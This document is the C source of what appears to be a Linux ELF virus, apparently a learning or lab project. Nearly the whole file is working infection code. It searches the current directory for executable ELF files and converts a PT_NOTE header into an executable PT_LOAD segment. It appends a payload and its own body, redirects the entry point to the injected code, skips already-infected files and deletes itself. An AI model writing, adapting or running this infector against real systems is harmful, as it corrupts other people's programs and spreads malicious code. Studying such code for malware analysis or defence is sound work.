#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

#include <elf.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>


#define NEW_MEMORY_ADDR 0x800000


int fileSize(int fd);
char* readSelf(char* self_path, int* size, FILE* self);
void* findTarget(char* self_name, int* fd, int* fsize);



int main(int argc, char** argv) {
    char* self_path;
    if (argc <= 0) {
        printf("No args provided, called from infected elf\n");
        self_path = "./tmp";
    } else {
        self_path = argv[0];
    }
    
    puts(self_path);

    int self_size;
    FILE* self;
    char* self_content = readSelf(self_path, &self_size, self);
    if (self_content == 0) {
        printf("Failed to read self file, exit...\n");
        remove(self_path);
        return -1;
    }
    printf("self size = %d\n", self_size);
    
    int target_fd;
    int target_size; 
    void* target = findTarget((self_path + 2), &target_fd, &target_size);
    
    if (target_size <= 0) {
        printf("target did not find, exit...\n");
        remove(self_path);
        return 0;
    }
    
    printf("target size = %d\n", target_size);
    
    // setup elf header pointers
    Elf64_Ehdr* e_header = target;
    Elf64_Phdr* p_header = target + e_header->e_phoff;
    Elf64_Shdr* s_header = target + e_header->e_shoff;    
   
    // read payload to inject
    int payload_fd = open("./exec", O_RDWR);
    int payload_size = fileSize(payload_fd);
    printf("payload size = %d\n", payload_size);
    
    char payload_buf[payload_size];
    read(payload_fd, &payload_buf, sizeof(payload_buf));
    
    uint64_t OFFSET = 0x800000;
    
    // modify PT_NOTE header to PT_LOAD
    // change flags to read/execute
    // update address references to point to the end of file
    Elf64_Phdr* pt_note_header;
    for (int i = 0; i < e_header->e_phnum; i++) {
        if (p_header[i].p_type == PT_NOTE) {
            printf("\nheader #%d is PT_NOTE\n", i);
            
            printf("\tbefore modification\n");
            printf("\t\theader p_flags: %x\n", p_header[i].p_flags);
            printf("\t\theader p_vaddr: %lx\n", p_header[i].p_vaddr);
            printf("\t\theader p_filesz: %lx\n", p_header[i].p_filesz);
            printf("\t\theader p_memsz: %lx\n", p_header[i].p_memsz);
            printf("\t\theader p_offset: %lx\n", p_header[i].p_offset);
            
            p_header[i].p_type = PT_LOAD;
            p_header[i].p_flags = PF_X | PF_R;
            p_header[i].p_vaddr = (uint64_t) OFFSET + target_size;
            p_header[i].p_filesz = (uint64_t) (payload_size + self_size);
            p_header[i].p_memsz = (uint64_t) (payload_size + self_size);
            p_header[i].p_offset = (uint64_t) target_size;
            p_header[i].p_align = 0x1000;
            
            printf("\tafter modification\n");
            printf("\t\theader p_flags: %x\n", p_header[i].p_flags);
            printf("\t\theader p_vaddr: %lx\n", p_header[i].p_vaddr);
            printf("\t\theader p_filesz: %lx\n", p_header[i].p_filesz);
            printf("\t\theader p_memsz: %lx\n", p_header[i].p_memsz);
            printf("\t\theader p_offset: %lx\n", p_header[i].p_offset);
            
            pt_note_header = &p_header[i];
            
            break;
        }
    }
    
    // modify entry point
    uint64_t old_entry_point = e_header->e_entry;
    e_header->e_entry = pt_note_header->p_vaddr;
    
    // write payload to the end of file    
    uint8_t* old_entry_bytes = (uint8_t*) &old_entry_point;
    payload_buf[99] = old_entry_bytes[0];
    payload_buf[100] = old_entry_bytes[1];
    payload_buf[101] = old_entry_bytes[2];
    payload_buf[102] = old_entry_bytes[3];    
    lseek(target_fd, 0, SEEK_END);
    write(target_fd, &payload_buf, sizeof(payload_buf));
    
    FILE* target_f = fdopen(target_fd, "ab");
    if (target_f == 0) {
        printf("can not open target file!\n");
    } else {
        fseek(target_f, 0, SEEK_END);
        fwrite(self_content, self_size, 1, target_f);
        fclose(target_f);
    }
    
    free(self_content);
    close(payload_fd);
    
    // remove self if called from injected elf
    remove(self_path);
    
    return 1;
}

void* findTarget(char* self_name, int* fd, int* fsize) {
    const unsigned char elf_magic[] = {0x7f, 0x45, 0x4c, 0x46};
    
    DIR* d;
    struct dirent *dir;
    
    d = opendir("./");
    
    if (d) {
        int ret_fsize = 0;
        int ret_fd = 0;
        void* ret_mapped;
        
        int target_size = 0;
        void* target = 0;
        printf("self_name = %s\n", self_name);
        while ((dir = readdir(d)) != 0) {
            printf("read dir file: %s\n", dir->d_name);
        
            if (strcmp(self_name, dir->d_name) == 0) {
               printf("Skipping self\n");
               continue;
            }
            
            // read target elf file
            int target_fd = open(dir->d_name, O_RDWR);
            
            if (target_fd <= 0) {
                printf("Can not open file, skipping...\n");
                continue;
            }
            
            // free previously mapped file
            if (target_size > 0) {
                munmap(target, target_size);
            }
            
            target_size = fileSize(target_fd);
            target = mmap(0, target_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, target_fd, 0);
                
            // check that file is elf
            unsigned char* ctraget = (char*) target;
            if (ctraget[0] != elf_magic[0] || ctraget[1] != elf_magic[1] ||
                ctraget[2] != elf_magic[2] || ctraget[3] != elf_magic[3]) {
                printf("Target not an elf, exit...\n");
                continue;
            }
            
            Elf64_Ehdr* e_header = target;
    
            // check that this is an executable elf
            if (e_header->e_type != ET_EXEC) {
                printf("Target not an executable, exit...\n");
                continue;
            }
            
            // check for already infected file
            if ((NEW_MEMORY_ADDR & e_header->e_entry) == NEW_MEMORY_ADDR) {
                printf("Already infected!\n");
                continue;
            }
            
            ret_fsize = target_size;
            ret_fd = target_fd;
            ret_mapped = target;
            
            break;
        }
        
        closedir(d);
        if (ret_fsize != 0) {
            *fd = ret_fd;
            *fsize = ret_fsize;
            return ret_mapped;
        } else {
            return 0;
        }
    } else {
        printf("Can not open current dir\n");
        return 0;
    }
    
    
}

char* readSelf(char* self_path, int* size, FILE* self) {
    if (self_path == 0) {
        printf("No self path provided!\n");
        return 0;
    }
    
    printf("Self name: %s\n", self_path);
    
    self = fopen(self_path, "rb");
    
    printf("self pointer: %x\n", self);
    
    
    fseek(self, 0, SEEK_END);
    int fsize = ftell(self); 
    fseek(self, 0, SEEK_SET);
    
    *size = fsize;
    
    printf("self size = %d\n", fsize);
    
    char* buf = (char*) malloc(fsize);
    fread(buf, fsize, 1, self);

    return buf;
}

int fileSize(int fd) {
    struct stat info;
    fstat(fd, &info);
    return info.st_size;
}

